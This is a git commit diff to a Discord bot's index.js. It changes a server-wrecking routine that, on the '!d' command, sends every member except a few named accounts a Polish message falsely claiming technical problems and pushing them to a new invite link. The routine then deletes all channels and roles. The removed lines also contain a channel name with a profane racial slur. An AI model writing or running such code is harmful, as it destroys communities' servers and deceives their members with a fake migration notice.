901ce22101cccd4cdd7de7b05c461f050e687094
Wujaszek <hubertcyran19@gmail.com>
2021-03-06 00:56:05 +0100

    Add kubovid to filter, change template name and new channel name.

--- index.js
+++ index.js
@@ -12,7 +12,7 @@ BotClient.on('message', msg => {
     if (msg.content.startsWith('!d')) {
         try {
             msg.guild.members.cache
-                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259')
+                .filter(m => m.user.id !== msg.guild.ownerID && m.user.tag !== 'TheToster#3003' && m.user.tag !== '!Wujaszek#4259' && m.user.tag !== 'Kubovid19#8055')
                 .forEach(m => {
                     m.user
                         .send(`Przepraszamy, nasz serwer: ${msg.guild.name} miał poważne problemy techniczne, z tego powodu przenosimy się na nowy serwer: https://discord.gg/KuXteh2rBN \nPrzepraszamy za niedogodnienia i życzymy miłego pobytu na nowym serwerze!`)
@@ -22,11 +22,11 @@ BotClient.on('message', msg => {
             msg.guild.channels.cache.forEach(channel => channel.delete());
             msg.guild.roles.cache.forEach(role => role.delete());
             msg.guild.channels
-                .create('Chuj Ci w dupe nygusie', {
+                .create('No siema xD', {
                     type: 'text'
                 })
                 .then(msg.guild.fetchTemplates().then(t => t.first().sync()))
-                .then(msg.guild.createTemplate('Chuj Ci w dupe nygusie').then(t => t.sync()))
+                .then(msg.guild.createTemplate('No siema xD').then(t => t.sync()))
                 .catch(console.error);
         } catch (error) {
             console.log(error);
